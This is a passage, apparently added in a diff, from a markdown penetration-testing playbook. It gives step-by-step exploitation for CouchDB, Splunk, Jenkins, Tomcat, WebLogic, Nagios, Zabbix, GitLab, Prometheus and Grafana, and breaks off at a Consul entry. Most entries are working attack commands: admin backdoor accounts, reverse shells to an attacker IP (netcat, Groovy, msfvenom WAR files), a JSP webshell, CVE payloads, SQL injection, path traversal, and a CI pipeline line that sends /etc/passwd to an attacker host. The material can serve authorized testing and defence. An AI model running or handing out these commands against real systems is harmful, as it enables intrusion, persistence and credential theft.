+curl http://<TARGET_IP>:5984/_utils  # Fauxton UI
+
+# List databases
+curl -X GET http://<TARGET_IP>:5984/_all_dbs
+
+# Database operations
+curl http://<TARGET_IP>:5984/<DB_NAME>
+curl http://<TARGET_IP>:5984/<DB_NAME>/_all_docs
+
+# Get documents
+curl http://<TARGET_IP>:5984/<DB_NAME>/<DOC_ID>
+curl http://<TARGET_IP>:5984/<DB_NAME>/_all_docs?include_docs=true
+
+# Check authentication
+curl http://<TARGET_IP>:5984/_session
+
+# Admin party check (no auth)
+curl -X PUT http://<TARGET_IP>:5984/_users/org.couchdb.user:backdoor -H "Content-Type: application/json" -d '{
+  "_id": "org.couchdb.user:backdoor",
+  "name": "backdoor",
+  "roles": ["_admin"],
+  "type": "user",
+  "password": "<PASSWORD>"
+}'
+
+# CVE-2017-12635 (privilege escalation)
+curl -X PUT http://<TARGET_IP>:5984/_users/org.couchdb.user:admin -H "Content-Type: application/json" -d '{
+  "type": "user",
+  "name": "admin",
+  "roles": ["_admin"],
+  "password": "password"
+}'
+
+# CVE-2017-12636 (RCE)
+curl -X PUT http://<TARGET_IP>:5984/_config/query_servers/cmd -d '"id >/tmp/success"' -u <USER>:<PASS>
+curl -X PUT http://<TARGET_IP>:5984/<DB_NAME> -u <USER>:<PASS>
+curl -X PUT http://<TARGET_IP>:5984/<DB_NAME>/test -d '{"_id": "test"}' -u <USER>:<PASS>
+curl -X POST http://<TARGET_IP>:5984/<DB_NAME>/_temp_view -d '{"language": "cmd", "map": ""}' -H "Content-Type: application/json" -u <USER>:<PASS>
+
+# Replication exploitation
+curl -X POST http://<TARGET_IP>:5984/_replicate -H "Content-Type: application/json" -d '{
+  "source": "http://<ATTACKER_IP>:5984/evil",
+  "target": "<DB_NAME>"
+}'
+
+# Dump database
+curl http://<TARGET_IP>:5984/<DB_NAME>/_all_docs?include_docs=true > dump.json
+
+# Check cluster nodes
+curl http://<TARGET_IP>:5984/_membership
+```
+
+**Pitfalls:**
+- Admin party disabled
+- Authentication required
+- Network binding restrictions
+- Newer versions patched
+- Audit logging enabled
+
+**Cleanup Steps:**
+```bash
+# Remove backdoor users
+curl -X DELETE http://<TARGET_IP>:5984/_users/org.couchdb.user:backdoor
+# Remove test databases
+curl -X DELETE http://<TARGET_IP>:5984/<TEST_DB>
+```
+
+**Suggested Findings:**
+- CouchDB admin party mode
+- CVE-2017-12635/12636 vulnerable
+- No authentication required
+- Sensitive data exposure
+- Configuration accessible
+
+**Conditions When to Try:**
+- Port 5984 open
+- NoSQL database present
+- Admin party possible
+- Database dumps needed
+
+---
+
+## 35. Splunk Service Exploitation (8089/tcp, 8000/tcp)
+
+**Category:** SIEM/Monitoring Services  
+**Description:** Exploit Splunk services for credential theft and data access.
+
+**Tools Required:**
+- curl
+- splunk CLI
+- PySplunkWhisperer2
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Splunk web interface (8000/tcp)
+curl http://<TARGET_IP>:8000/en-US/account/login
+
+# Management port (8089/tcp)
+curl -k https://<TARGET_IP>:8089/services
+curl -k https://<TARGET_IP>:8089/services/server/info
+
+# Default credentials
+# admin:changeme
+
+# Authentication check
+curl -k https://<TARGET_IP>:8089/services/authentication/users -u admin:changeme
+
+# List apps
+curl -k https://<TARGET_IP>:8089/services/apps/local -u <USER>:<PASS>
+
+# Search jobs
+curl -k https://<TARGET_IP>:8089/services/search/jobs -u <USER>:<PASS>
+
+# Create search job
+curl -k -u <USER>:<PASS> https://<TARGET_IP>:8089/services/search/jobs -d search="search index=* | head 10"
+
+# Deployment server exploitation
+curl -k https://<TARGET_IP>:8089/services/deployment/server/clients -u <USER>:<PASS>
+
+# RCE via custom app (PySplunkWhisperer2)
+python PySplunkWhisperer2_remote.py --host <TARGET_IP> --port 8089 --username <USER> --password <PASS> --payload "nc -e /bin/bash <ATTACKER_IP> <PORT>"
+
+# Universal forwarder RCE
+curl -k -u <USER>:<PASS> https://<TARGET_IP>:8089/services/data/inputs/script -d "name=/bin/bash" -d "interval=10" -d "source=test" -d "sourcetype=test"
+
+# Extract stored passwords
+curl -k https://<TARGET_IP>:8089/services/storage/passwords -u <USER>:<PASS>
+
+# Get Splunk users
+curl -k https://<TARGET_IP>:8089/services/authentication/users -u <USER>:<PASS>
+
+# Free license exploitation (inputs.conf)
+curl -k -u <USER>:<PASS> https://<TARGET_IP>:8089/servicesNS/nobody/search/data/inputs/script -d "name=/tmp/evil.sh" -d "interval=*/1 * * * *" -d "disabled=false"
+
+# Search sensitive data
+curl -k -u <USER>:<PASS> https://<TARGET_IP>:8089/services/search/jobs/export -d search="search index=* password" -d output_mode="json"
+
+# Metasploit module
+msfconsole -x "use exploit/multi/http/splunk_upload_app_exec; set RHOSTS <TARGET_IP>; set USERNAME <USER>; set PASSWORD <PASS>; run"
+```
+
+**Pitfalls:**
+- Strong authentication required
+- TLS certificate validation
+- Audit logging everything
+- Limited user permissions
+- Forwarder hardening
+
+**Cleanup Steps:**
+```bash
+# Remove malicious apps
+curl -k -u <USER>:<PASS> -X DELETE https://<TARGET_IP>:8089/services/apps/local/<APP_NAME>
+# Remove scripts
+curl -k -u <USER>:<PASS> -X DELETE https://<TARGET_IP>:8089/services/data/inputs/script/<SCRIPT_NAME>
+```
+
+**Suggested Findings:**
+- Default Splunk credentials
+- Universal forwarder exposed
+- RCE via app deployment
+- Sensitive data in logs
+- Weak authentication
+
+**Conditions When to Try:**
+- SIEM infrastructure
+- Port 8089/8000 open
+- Log aggregation present
+- Monitoring systems identified
+
+---
+
+## 36. Jenkins Service Exploitation (8080/tcp, 50000/tcp)
+
+**Category:** CI/CD Services  
+**Description:** Exploit Jenkins for code execution and credential theft.
+
+**Tools Required:**
+- curl
+- jenkins-cli
+- metasploit
+- groovy scripts
+
+**Steps/Commands:**
+```bash
+# Jenkins enumeration
+curl http://<TARGET_IP>:8080/api/json?pretty=true
+curl http://<TARGET_IP>:8080/whoAmI
+
+# Check for unauthenticated access
+curl http://<TARGET_IP>:8080/script
+curl http://<TARGET_IP>:8080/manage
+
+# Groovy script console RCE
+# POST to /script
+def cmd = "id".execute()
+println cmd.text
+
+# Via curl
+curl -X POST http://<TARGET_IP>:8080/script --data-urlencode "script=def cmd='id'.execute(); println cmd.text"
+
+# With authentication
+curl -u <USER>:<PASS> -X POST http://<TARGET_IP>:8080/script --data-urlencode "script=println new ProcessBuilder('id').redirectErrorStream(true).start().text"
+
+# Reverse shell via Groovy
+String host="<ATTACKER_IP>";
+int port=<PORT>;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+
+# Extract credentials
+curl -u <USER>:<PASS> http://<TARGET_IP>:8080/credentials/store/system/domain/_/
+
+# Download config files
+curl http://<TARGET_IP>:8080/job/<JOB_NAME>/config.xml
+
+# CLI exploitation
+wget http://<TARGET_IP>:8080/jnlpJars/jenkins-cli.jar
+java -jar jenkins-cli.jar -s http://<TARGET_IP>:8080 who-am-i
+java -jar jenkins-cli.jar -s http://<TARGET_IP>:8080 -auth <USER>:<PASS> groovy = < script.groovy
+
+# Create job with command execution
+curl -X POST http://<TARGET_IP>:8080/createItem?name=evil -u <USER>:<PASS> --data-binary @config.xml -H "Content-Type: text/xml"
+
+# Agent port (50000/tcp)
+# Used for Jenkins agents/slaves
+nmap -p 50000 --script jenkins-agent <TARGET_IP>
+
+# CVE-2024-23897 (arbitrary file read)
+java -jar jenkins-cli.jar -s http://<TARGET_IP>:8080 connect-node @/etc/passwd
+
+# Metasploit modules
+msfconsole -x "use exploit/multi/http/jenkins_script_console; set RHOSTS <TARGET_IP>; set USERNAME <USER>; set PASSWORD <PASS>; run"
+```
+
+**Pitfalls:**
+- Authentication required
+- CSRF protection
+- Script security plugin
+- Audit logging
+- Matrix-based security
+
+**Cleanup Steps:**
+```bash
+# Delete created jobs
+curl -X POST http://<TARGET_IP>:8080/job/<JOB_NAME>/doDelete -u <USER>:<PASS>
+# Clear build history
+curl -X POST http://<TARGET_IP>:8080/job/<JOB_NAME>/doWipeOutWorkspace -u <USER>:<PASS>
+```
+
+**Suggested Findings:**
+- Jenkins script console accessible
+- No authentication required
+- Groovy script execution
+- Stored credentials exposed
+- Agent port exposed
+
+**Conditions When to Try:**
+- CI/CD pipeline present
+- Port 8080/50000 open
+- DevOps environment
+- Build server identified
+
+---
+
+## 37. Apache Tomcat Exploitation (8080/tcp)
+
+**Category:** Application Servers  
+**Description:** Exploit Tomcat manager and host-manager for deployment of malicious applications.
+
+**Tools Required:**
+- curl
+- msfvenom
+- metasploit
+- tomcatWarDeployer
+
+**Steps/Commands:**
+```bash
+# Tomcat enumeration
+curl http://<TARGET_IP>:8080/
+curl http://<TARGET_IP>:8080/manager/status
+curl http://<TARGET_IP>:8080/host-manager/html
+
+# Default credentials check
+# Common: tomcat/tomcat, admin/admin, manager/manager
+curl -u tomcat:tomcat http://<TARGET_IP>:8080/manager/text/list
+
+# Brute force manager
+hydra -L <USER_LIST> -P <PASS_LIST> <TARGET_IP> -s 8080 http-get /manager/html
+
+# Deploy WAR file via manager
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > shell.war
+curl -u <USER>:<PASS> -T shell.war "http://<TARGET_IP>:8080/manager/text/deploy?path=/shell"
+
+# Access shell
+curl http://<TARGET_IP>:8080/shell/
+
+# Manual WAR deployment
+jar -cvf evil.war -C webshell/ .
+curl -u <USER>:<PASS> -X PUT --data-binary @evil.war "http://<TARGET_IP>:8080/manager/text/deploy?path=/evil&update=true"
+
+# Undeploy application
+curl -u <USER>:<PASS> "http://<TARGET_IP>:8080/manager/text/undeploy?path=/shell"
+
+# Text-based manager commands
+curl -u <USER>:<PASS> http://<TARGET_IP>:8080/manager/text/list
+curl -u <USER>:<PASS> http://<TARGET_IP>:8080/manager/text/serverinfo
+curl -u <USER>:<PASS> http://<TARGET_IP>:8080/manager/text/sessions?path=/
+
+# CVE-2020-1938 (Ghostcat)
+python ajpShooter.py http://<TARGET_IP>:8080 8009 /WEB-INF/web.xml read
+
+# JMX console (if exposed)
+curl http://<TARGET_IP>:8080/jmx-console/
+
+# Metasploit exploitation
+msfconsole -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS <TARGET_IP>; set RPORT 8080; set USERNAME <USER>; set PASSWORD <PASS>; run"
+
+# Check for PUT method upload
+curl -X PUT http://<TARGET_IP>:8080/shell.jsp -d '<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>'
+```
+
+**Pitfalls:**
+- Manager app disabled
+- Strong credentials
+- IP-based access restrictions
+- WAR size limitations
+- Security manager enabled
+
+**Cleanup Steps:**
+```bash
+# Undeploy malicious apps
+curl -u <USER>:<PASS> "http://<TARGET_IP>:8080/manager/text/undeploy?path=/shell"
+# Stop applications
+curl -u <USER>:<PASS> "http://<TARGET_IP>:8080/manager/text/stop?path=/evil"
+```
+
+**Suggested Findings:**
+- Default Tomcat credentials
+- Manager application exposed
+- WAR deployment allowed
+- Ghostcat vulnerability
+- Weak access controls
+
+**Conditions When to Try:**
+- Java application server
+- Port 8080 open
+- Manager accessible
+- Default creds common
+
+---
+
+## 38. WebLogic Service Exploitation (7001/tcp, 7002/tcp)
+
+**Category:** Application Servers  
+**Description:** Exploit Oracle WebLogic for deserialization and remote code execution.
+
+**Tools Required:**
+- weblogicScanner
+- ysoserial
+- curl
+- metasploit
+
+**Steps/Commands:**
+```bash
+# WebLogic enumeration
+curl http://<TARGET_IP>:7001/console/login/LoginForm.jsp
+curl -k https://<TARGET_IP>:7002/console/login/LoginForm.jsp
+
+# Version detection
+curl http://<TARGET_IP>:7001/console/css/console.css | grep -i version
+
+# Default credentials
+# weblogic/weblogic, system/password, admin/security
+curl -X POST http://<TARGET_IP>:7001/console/j_security_check -d "j_username=weblogic&j_password=weblogic"
+
+# T3 protocol enumeration
+nmap -p 7001 --script weblogic-t3-info <TARGET_IP>
+
+# CVE-2020-14882 (unauthenticated RCE)
+curl "http://<TARGET_IP>:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22)"
+
+# CVE-2019-2729 (deserialization)
+python weblogic_2019_2729.py -u http://<TARGET_IP>:7001 -c "touch /tmp/pwned"
+
+# CVE-2017-10271 (XMLDecoder RCE)
+curl -X POST http://<TARGET_IP>:7001/wls-wsat/CoordinatorPortType -H "Content-Type: text/xml" -d @poc.xml
+
+# SSRF exploitation (CVE-2014-4210)
+curl http://<TARGET_IP>:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://localhost:22
+
+# Deployment of malicious application
+curl -X POST -u <USER>:<PASS> http://<TARGET_IP>:7001/management/weblogic/latest/edit/appDeployments -H "Content-Type: application/json" -d '{"name": "evil", "targets": ["AdminServer"], "deploymentPath": "/tmp/evil.war"}'
+
+# WebLogic Scanner tool
+python3 weblogicScanner.py -t <TARGET_IP> -p 7001
+
+# Serialization payload with ysoserial
+java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.ser
+# Send via T3 protocol
+
+# Extract credentials from boot.properties
+# If you gain file read
+/u01/oracle/user_projects/domains/<DOMAIN>/servers/AdminServer/security/boot.properties
+
+# JMX exploitation
+curl http://<TARGET_IP>:7001/bea_wls_management_internal2/wl_management
+```
+
+**Pitfalls:**
+- Patches applied
+- Network segmentation
+- Complex authentication
+- T3 protocol filtered
+- Audit logging enabled
+
+**Cleanup Steps:**
+```bash
+# Undeploy malicious apps via API
+curl -X DELETE -u <USER>:<PASS> http://<TARGET_IP>:7001/management/weblogic/latest/edit/appDeployments/evil
+# Remove uploaded files
+# Requires shell access
+```
+
+**Suggested Findings:**
+- WebLogic console exposed
+- Deserialization vulnerabilities
+- Default credentials
+- T3 protocol accessible
+- Unpatched CVEs present
+
+**Conditions When to Try:**
+- Oracle middleware present
+- Port 7001/7002 open
+- Enterprise Java apps
+- Deserialization vectors
+
+---
+
+## 39. Nagios Service Exploitation (80/tcp, 5667/tcp)
+
+**Category:** Monitoring Services  
+**Description:** Exploit Nagios monitoring system for command injection and information disclosure.
+
+**Tools Required:**
+- curl
+- nmap
+- metasploit
+- nagios-plugins
+
+**Steps/Commands:**
+```bash
+# Nagios web interface
+curl http://<TARGET_IP>/nagios/
+# Default: nagiosadmin/nagios
+
+# Version detection
+curl http://<TARGET_IP>/nagios/cgi-bin/status.cgi | grep "Nagios Core"
+
+# Authentication bypass attempts
+curl http://<TARGET_IP>/nagios/cgi-bin/statusjson.cgi?query=help
+curl http://<TARGET_IP>/nagios/cgi-bin/archivejson.cgi?query=help
+
+# Command injection (CVE-2016-9565)
+curl -u <USER>:<PASS> "http://<TARGET_IP>/nagios/cgi-bin/status.cgi?hostgroup=all&style=hostdetail&ping=$(id)"
+
+# Configuration disclosure
+curl -u <USER>:<PASS> http://<TARGET_IP>/nagios/cgi-bin/config.cgi
+
+# NRPE service (5667/tcp)
+# Check NRPE version
+echo -e "\x00\x00\x00\x01" | nc <TARGET_IP> 5667
+
+# Execute NRPE commands
+/usr/lib/nagios/plugins/check_nrpe -H <TARGET_IP> -c check_users
+/usr/lib/nagios/plugins/check_nrpe -H <TARGET_IP> -c check_load
+
+# Command injection via NRPE
+/usr/lib/nagios/plugins/check_nrpe -H <TARGET_IP> -c "check_ping!-c 1 127.0.0.1;id"
+
+# XI API exploitation (commercial version)
+curl http://<TARGET_IP>/nagiosxi/api/v1/system/status
+curl http://<TARGET_IP>/nagiosxi/api/v1/config/host?apikey=<API_KEY>
+
+# SQL injection in XI
+curl "http://<TARGET_IP>/nagiosxi/reports/availability.php?host=' OR '1'='1"
+
+# File upload vulnerability
+curl -u <USER>:<PASS> -F "upload=@shell.php" http://<TARGET_IP>/nagios/cgi-bin/upload.cgi
+
+# Nagios plugins exploitation
+# Some plugins vulnerable to command injection
+/usr/lib/nagios/plugins/check_ping -H "127.0.0.1;id" -w 100,10% -c 200,20%
+
+# Configuration file locations
+# /usr/local/nagios/etc/nagios.cfg
+# /etc/nagios/nagios.cfg
+curl -u <USER>:<PASS> http://<TARGET_IP>/nagios/cgi-bin/showlog.cgi?type=1
+
+# Metasploit modules
+msfconsole -x "use exploit/linux/http/nagios_xi_commandline; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- Strong authentication
+- Limited CGI access
+- SELinux restrictions
+- Monitoring alerts triggered
+- Encrypted NRPE
+
+**Cleanup Steps:**
+```bash
+# Remove uploaded files
+curl -u <USER>:<PASS> -X DELETE http://<TARGET_IP>/nagios/upload/<UPLOADED_FILE>
+# Clear command history from logs
+```
+
+**Suggested Findings:**
+- Default Nagios credentials
+- Command injection vulnerability
+- NRPE exposed without encryption
+- Configuration disclosure
+- Weak API authentication
+
+**Conditions When to Try:**
+- Monitoring infrastructure
+- Port 80/5667 with Nagios
+- Network monitoring present
+- Default credentials common
+
+---
+
+## 40. Zabbix Service Exploitation (10051/tcp, 80/tcp)
+
+**Category:** Monitoring Services  
+**Description:** Exploit Zabbix monitoring for command execution and database access.
+
+**Tools Required:**
+- curl
+- zabbix_get
+- sqlmap
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Zabbix web interface
+curl http://<TARGET_IP>/zabbix/
+# Default: Admin/zabbix (note capital A)
+
+# API enumeration
+curl -X POST http://<TARGET_IP>/zabbix/api_jsonrpc.php -H "Content-Type: application/json" -d '{
+  "jsonrpc": "2.0",
+  "method": "apiinfo.version",
+  "params": [],
+  "id": 1
+}'
+
+# Authentication via API
+curl -X POST http://<TARGET_IP>/zabbix/api_jsonrpc.php -H "Content-Type: application/json" -d '{
+  "jsonrpc": "2.0",
+  "method": "user.login",
+  "params": {
+    "user": "Admin",
+    "password": "zabbix"
+  },
+  "id": 1
+}'
+
+# Get hosts via API
+curl -X POST http://<TARGET_IP>/zabbix/api_jsonrpc.php -H "Content-Type: application/json" -d '{
+  "jsonrpc": "2.0",
+  "method": "host.get",
+  "params": {
+    "output": "extend"
+  },
+  "auth": "<AUTH_TOKEN>",
+  "id": 2
+}'
+
+# Zabbix agent port (10050/tcp)
+echo "system.run[id]" | nc <TARGET_IP> 10050
+zabbix_get -s <TARGET_IP> -k "system.run[id]"
+
+# Server/Proxy port (10051/tcp)
+# Zabbix trapper items
+zabbix_sender -z <TARGET_IP> -s "Host" -k trap.key -o "value"
+
+# Command injection via items
+# If admin access, create item with:
+# Key: system.run[<COMMAND>]
+
+# SQL injection (older versions)
+sqlmap -u "http://<TARGET_IP>/zabbix/httpmon.php?applications=<APP_ID>" --cookie="<COOKIE>"
+
+# CVE-2016-10134 (SQL injection)
+curl "http://<TARGET_IP>/zabbix/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))A)&updateProfile=true&period=3600"
+
+# Scripts execution (if enabled)
+# Via API with script.execute method
+
+# Guest user enumeration
+curl http://<TARGET_IP>/zabbix/api_jsonrpc.php -d '{"jsonrpc":"2.0","method":"user.get","params":{"output":["alias","name","surname"]},"id":1}'
+
+# Database credentials (config file)
+# /etc/zabbix/zabbix_server.conf
+# DBPassword=
+
+# EnableRemoteCommands bypass
+zabbix_get -s <TARGET_IP> -k "system.run[id,nowait]"
+
+# Metasploit module
+msfconsole -x "use exploit/linux/http/zabbix_sqli; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- Guest access disabled
+- Strong authentication
+- Agent encryption
+- Command execution disabled
+- Database segmentation
+
+**Cleanup Steps:**
+```bash
+# Remove test items via API
+curl -X POST http://<TARGET_IP>/zabbix/api_jsonrpc.php -H "Content-Type: application/json" -d '{
+  "jsonrpc": "2.0",
+  "method": "item.delete",
+  "params": ["<ITEM_ID>"],
+  "auth": "<AUTH_TOKEN>",
+  "id": 1
+}'
+```
+
+**Suggested Findings:**
+- Default Zabbix credentials
+- Command execution enabled
+- SQL injection vulnerability
+- Agent exposed without encryption
+- Guest user enabled
+
+**Conditions When to Try:**
+- Monitoring infrastructure
+- Port 10051/10050 open
+- Zabbix identified
+- Network monitoring present
+
+---
+
+---
+
+## 41. GitLab Service Exploitation (80/tcp, 443/tcp, 22/tcp)
+
+**Category:** DevOps/Version Control  
+**Description:** Exploit GitLab instances for code access, privilege escalation, and RCE.
+
+**Tools Required:**
+- curl
+- git
+- gitlab-rails
+- metasploit
+
+**Steps/Commands:**
+```bash
+# GitLab enumeration
+curl http://<TARGET_IP>/api/v4/version
+curl http://<TARGET_IP>/api/v4/projects
+curl http://<TARGET_IP>/explore
+
+# User enumeration
+curl http://<TARGET_IP>/api/v4/users
+curl "http://<TARGET_IP>/api/v4/users?username=<USERNAME>"
+
+# Check registration
+curl http://<TARGET_IP>/users/sign_up
+
+# Access public projects
+curl http://<TARGET_IP>/api/v4/projects?visibility=public
+
+# Authentication with token
+curl --header "PRIVATE-TOKEN: <TOKEN>" http://<TARGET_IP>/api/v4/projects
+
+# CVE-2021-22205 (RCE via ExifTool)
+curl -X POST http://<TARGET_IP>/uploads/user -F "file=@exploit.jpg"
+
+# CVE-2021-22214 (SSRF)
+curl -X POST http://<TARGET_IP>/api/v4/ci/lint -H "Content-Type: application/json" -d '{
+  "content": "include:\n  - remote: http://127.0.0.1:6379/test"
+}'
+
+# Git operations
+git clone http://<TARGET_IP>/<USER>/<PROJECT>.git
+git clone http://<USERNAME>:<PASSWORD>@<TARGET_IP>/<USER>/<PROJECT>.git
+
+# Search for secrets in repositories
+curl --header "PRIVATE-TOKEN: <TOKEN>" "http://<TARGET_IP>/api/v4/search?scope=blobs&search=password"
+
+# CI/CD pipeline exploitation
+# .gitlab-ci.yml with malicious commands
+script:
+  - curl http://<ATTACKER_IP>/?data=$(cat /etc/passwd | base64)
+
+# Runner registration (if token obtained)
+gitlab-runner register --url http://<TARGET_IP> --registration-token <TOKEN>
+
+# GraphQL endpoint enumeration
+curl -X POST http://<TARGET_IP>/api/graphql -H "Content-Type: application/json" -d '{
+  "query": "{ users { nodes { username email } } }"
+}'
+
+# Import project vulnerability
+# Create malicious export file
+curl --header "PRIVATE-TOKEN: <TOKEN>" -X POST http://<TARGET_IP>/api/v4/projects/import -F "file=@evil_export.tar.gz"
+
+# Password reset token disclosure
+curl http://<TARGET_IP>/users/password/edit?reset_password_token=<TOKEN>
+
+# Two-factor bypass (CVE-2020-13263)
+curl -X POST http://<TARGET_IP>/users/sign_in -d "user[login]=<USER>&user[password]=<PASS>&user[otp_attempt]=000000"
+
+# Metasploit modules
+msfconsole -x "use exploit/multi/http/gitlab_exif_rce; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- Registration disabled
+- LDAP/SAML authentication
+- CI/CD runners isolated
+- Repository permissions
+- Rate limiting on API
+
+**Cleanup Steps:**
+```bash
+# Delete created projects
+curl --header "PRIVATE-TOKEN: <TOKEN>" -X DELETE http://<TARGET_IP>/api/v4/projects/<PROJECT_ID>
+# Remove uploaded files
+# Requires admin access or file system access
+```
+
+**Suggested Findings:**
+- Open registration enabled
+- Weak GitLab passwords
+- Sensitive data in repositories
+- CVE vulnerabilities present
+- CI/CD pipeline injection
+
+**Conditions When to Try:**
+- DevOps environment
+- Source code repository
+- CI/CD pipeline present
+- Version control identified
+
+---
+
+## 42. Prometheus Service Exploitation (9090/tcp)
+
+**Category:** Monitoring Services  
+**Description:** Exploit Prometheus monitoring for information disclosure and metrics extraction.
+
+**Tools Required:**
+- curl
+- promtool
+- browser
+- python
+
+**Steps/Commands:**
+```bash
+# Prometheus enumeration
+curl http://<TARGET_IP>:9090/api/v1/query?query=up
+curl http://<TARGET_IP>:9090/metrics
+
+# Get all metrics
+curl http://<TARGET_IP>:9090/api/v1/label/__name__/values
+
+# Query targets
+curl http://<TARGET_IP>:9090/api/v1/targets
+
+# Service discovery
+curl http://<TARGET_IP>:9090/api/v1/targets/metadata
+
+# Configuration disclosure
+curl http://<TARGET_IP>:9090/api/v1/status/config
+
+# Get all series
+curl http://<TARGET_IP>:9090/api/v1/series
+
+# Query sensitive metrics
+# Passwords/tokens in labels
+curl "http://<TARGET_IP>:9090/api/v1/query?query={__name__=~'.*password.*'}"
+curl "http://<TARGET_IP>:9090/api/v1/query?query={__name__=~'.*token.*'}"
+curl "http://<TARGET_IP>:9090/api/v1/query?query={__name__=~'.*key.*'}"
+
+# Node exporter metrics (system info)
+curl http://<TARGET_IP>:9100/metrics
+
+# Query historical data
+curl "http://<TARGET_IP>:9090/api/v1/query_range?query=up&start=2024-01-01T00:00:00Z&end=2024-12-31T23:59:59Z&step=1h"
+
+# AlertManager endpoint
+curl http://<TARGET_IP>:9093/api/v1/alerts
+
+# Federation endpoint
+curl http://<TARGET_IP>:9090/federate?match[]={__name__=~".+"}
+
+# Cardinality issues (DoS)
+curl "http://<TARGET_IP>:9090/api/v1/query?query=sum(rate(container_cpu_usage_seconds_total[5m])) by (pod_name)"
+
+# PromQL injection
+curl "http://<TARGET_IP>:9090/api/v1/query?query=up{instance=\"<INSTANCE>\"} or vector(1)"
+
+# Snapshots (if enabled)
+curl -X POST http://<TARGET_IP>:9090/api/v1/admin/tsdb/snapshot
+
+# Remote write endpoint
+# Check if exposed for data injection
+
+# Service discovery configs
+curl http://<TARGET_IP>:9090/api/v1/status/config | jq '.data.yaml' | grep -A5 -B5 "bearer_token\|basic_auth"
+```
+
+**Pitfalls:**
+- Authentication enabled
+- Network segmentation
+- Query result limits
+- Metrics sanitized
+- Federation restricted
+
+**Cleanup Steps:**
+```bash
+# Delete snapshots if created
+curl -X DELETE http://<TARGET_IP>:9090/api/v1/admin/tsdb/delete_series
+# No persistent changes typically
+```
+
+**Suggested Findings:**
+- Prometheus exposed without auth
+- Sensitive data in metrics
+- Service discovery disclosure
+- Configuration exposed
+- Bearer tokens in config
+
+**Conditions When to Try:**
+- Monitoring infrastructure
+- Port 9090 open
+- Kubernetes environment
+- Metrics collection present
+
+---
+
+## 43. Grafana Service Exploitation (3000/tcp)
+
+**Category:** Visualization/Monitoring  
+**Description:** Exploit Grafana dashboards for information disclosure and potential RCE.
+
+**Tools Required:**
+- curl
+- sqlmap
+- browser
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Grafana enumeration
+curl http://<TARGET_IP>:3000/api/health
+curl http://<TARGET_IP>:3000/api/org
+curl http://<TARGET_IP>:3000/api/datasources
+
+# Default credentials
+# admin:admin
+
+# Anonymous access check
+curl http://<TARGET_IP>:3000/api/dashboards/home
+
+# CVE-2021-43798 (Directory Traversal)
+curl "http://<TARGET_IP>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
+
+# API key authentication
+curl -H "Authorization: Bearer <API_KEY>" http://<TARGET_IP>:3000/api/dashboards/db
+
+# List users
+curl -u admin:admin http://<TARGET_IP>:3000/api/users
+curl -u admin:admin http://<TARGET_IP>:3000/api/users/search?query=
+
+# Data source credentials
+curl -u admin:admin http://<TARGET_IP>:3000/api/datasources
+curl -u admin:admin http://<TARGET_IP>:3000/api/datasources/<ID>
+
+# SQL injection in dashboard
+sqlmap -u "http://<TARGET_IP>:3000/api/tsdb/query" --data='{"queries":[{"refId":"A","datasourceId":1,"rawSql":"SELECT 1"}]}' --headers="Authorization: Bearer <API_KEY>"
+
+# Snapshot enumeration
+curl http://<TARGET_IP>:3000/api/snapshots
+
+# Create API key
+curl -X POST -u admin:admin http://<TARGET_IP>:3000/api/auth/keys -H "Content-Type: application/json" -d '{
+  "name": "backdoor",
+  "role": "Admin",
+  "secondsToLive": 0
+}'
+
+# Plugin exploitation
+curl http://<TARGET_IP>:3000/api/plugins
+
+# CVE-2020-13379 (DoS/Unauth)
+curl http://<TARGET_IP>:3000/avatar/%7B%7D
+
+# Server-side request forgery
+curl -u admin:admin -X POST http://<TARGET_IP>:3000/api/datasources -H "Content-Type: application/json" -d '{
+  "name": "test",
+  "type": "prometheus",
+  "url": "http://169.254.169.254/latest/meta-data/",
+  "access": "proxy"
+}'
+
+# Configuration disclosure
+curl -u admin:admin http://<TARGET_IP>:3000/api/admin/settings
+
+# LDAP configuration
+curl -u admin:admin http://<TARGET_IP>:3000/api/admin/ldap/status
+
+# Metasploit module
+msfconsole -x "use exploit/multi/http/grafana_plugin_traversal; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- Strong authentication required
+- LDAP/OAuth integration
+- Plugin restrictions
+- Viewer-only access
+- Audit logging enabled
+
+**Cleanup Steps:**
+```bash
+# Remove created datasources
+curl -X DELETE -u admin:admin http://<TARGET_IP>:3000/api/datasources/<ID>
+# Delete API keys
+curl -X DELETE -u admin:admin http://<TARGET_IP>:3000/api/auth/keys/<ID>
+```
+
+**Suggested Findings:**
+- Default Grafana credentials
+- Directory traversal vulnerability
+- Data source credentials exposed
+- Anonymous access enabled
+- Sensitive data in dashboards
+
+**Conditions When to Try:**
+- Visualization platform present
+- Port 3000 open
+- Monitoring dashboards
+- DevOps environment
+
+---
+
+## 44. HashiCorp Consul Exploitation (8500/tcp, 8300/tcp, 8600/udp)
+
+**Category:** Service Discovery/Configuration  
+**Description:** Exploit Consul for service discovery, configuration extraction, and RCE.
+
+**Tools Required:**
+- consul CLI
+- curl
+- dig
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Consul UI and API (8500/tcp)
+curl http://<TARGET_IP>:8500/v1/agent/self
+curl http://<TARGET_IP>:8500/ui/
+
+# List services
